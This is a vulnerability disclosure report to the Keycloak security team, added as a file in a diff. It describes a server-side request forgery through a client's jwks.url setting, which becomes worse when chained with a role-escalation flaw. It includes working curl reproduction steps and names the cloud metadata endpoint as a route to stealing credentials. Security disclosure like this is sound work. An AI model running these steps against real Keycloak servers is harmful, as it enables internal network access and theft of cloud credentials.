@@ -1,0 +1,112 @@
+Hi Keycloak Security Team,
+
+I am reporting a Server-Side Request Forgery (SSRF) vulnerability in
+Keycloak that allows an administrator (or a lower-privileged user via
+a separate privilege escalation vulnerability reported previously) to
+force the Keycloak server to make HTTP requests to arbitrary internal
+endpoints via the client jwks_uri configuration.
+
+Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
+Tested on: Keycloak 999.0.0-SNAPSHOT built from source
+
+AI Disclosure: AI tools were used to assist in drafting this report. The
+vulnerability was manually discovered, verified, and reproduced.
+
+DESCRIPTION:
+When a client is configured with `clientAuthenticatorType: client-jwt`
+and `use.jwks.url: true`, the `jwks.url` attribute accepts any URL
+including internal/private network addresses. When a client authentication
+attempt is made, Keycloak's server fetches the JWKS URL directly, allowing
+an attacker to reach internal services, perform port scanning, and in
+cloud environments (AWS/GCP/Azure) access instance metadata endpoints
+such as http://169.254.169.254/.
+
+ROOT CAUSE:
+No validation or allowlist is applied to the jwks.url value before
+Keycloak's server-side HTTP client fetches it. Any URL including
+RFC 1918 addresses, loopback, link-local, and cloud metadata endpoints
+is accepted and fetched.
+
+CHAINED ATTACK SCENARIO:
+When combined with the Composite Role Escalation vulnerability I reported
+separately, a user with only manage-users permission can:
+1. Self-assign a composite role to gain create-client + manage-clients
+2. Create a client with jwks.url pointing to an internal target
+3. Trigger the SSRF by sending a client authentication request
+
+This chain elevates the SSRF from requiring admin access (Medium) to
+being exploitable by any user with manage-users (High).
+
+REPRODUCTION STEPS:
+
+1. Start Keycloak in dev mode on port 8084
+
+2. Get admin token:
+
+KC=http://localhost:8084
+tok() {
+  curl -s $KC/realms/master/protocol/openid-connect/token \
+    -d client_id=admin-cli -d username=admin -d password=admin \
+    -d grant_type=password \
+    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
+}
+T=$(tok)
+
+3. Start a listener on port 9999 (simulating an internal service):
+
+python3 -c '
+import http.server, json
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f"GOT REQUEST: {self.path}")
+        print(f"Headers: {self.headers}")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(json.dumps({"keys":[]}).encode())
+http.server.HTTPServer(("0.0.0.0",9999),H).serve_forever()
+'
+
+4. Create a client with internal jwks_uri:
+
+T=$(tok)
+curl -s -X POST $KC/admin/realms/master/clients \
+  -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "clientId":"ssrf-test",
+    "clientAuthenticatorType":"client-jwt",
+    "attributes":{"use.jwks.url":"true","jwks.url":"http://127.0.0.1:9999/internal-ssrf-poc"}
+  }'
+
+5. Trigger the SSRF:
+
+curl -s -X POST $KC/realms/master/protocol/openid-connect/token \
+  -d "client_id=ssrf-test" \
+  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+  -d "client_assertion=eyJhbGciOiJSUzI1NiIsImtpZCI6InRlc3QifQ.eyJpc3MiOiJzc3JmLXRlc3QiLCJzdWIiOiJzc3JmLXRlc3QiLCJhdWQiOiJodHRwOi8vbG9jYWxob3N0OjgwODQvcmVhbG1zL21hc3RlciIsImlhdCI6MTcyOTAwMDAwMCwiZXhwIjoxODI5OTk5OTk5fQ.fake" \
+  -d "grant_type=client_credentials"
+
+6. The listener receives a GET request from Keycloak:
+
+[!] GOT REQUEST from Keycloak!
+    Path: /internal-ssrf-poc
+    Host: 127.0.0.1:9999
+    User-Agent: Apache-HttpClient/4.5.14 (Java/17.0.20.1)
+
+IMPACT:
+- Internal network port scanning and service discovery
+- Cloud metadata theft (AWS IAM credentials, GCP service account tokens)
+  via http://169.254.169.254/
+- Access to internal APIs and services not exposed to the internet
+- When chained with composite role escalation: exploitable by any user
+  with manage-users permission, not just realm admins
+
+CVSS 3.1 (standalone): 4.1 (Medium)
+Vector: AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N
+
+CVSS 3.1 (chained with privilege escalation): 8.1 (High)
+Vector: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
+
+Credit: Muhannad Alsaif (xNadByte)
+Contact: Mohnadalsaif1@gmail.com
+GitHub: Mohnad-AL-saif
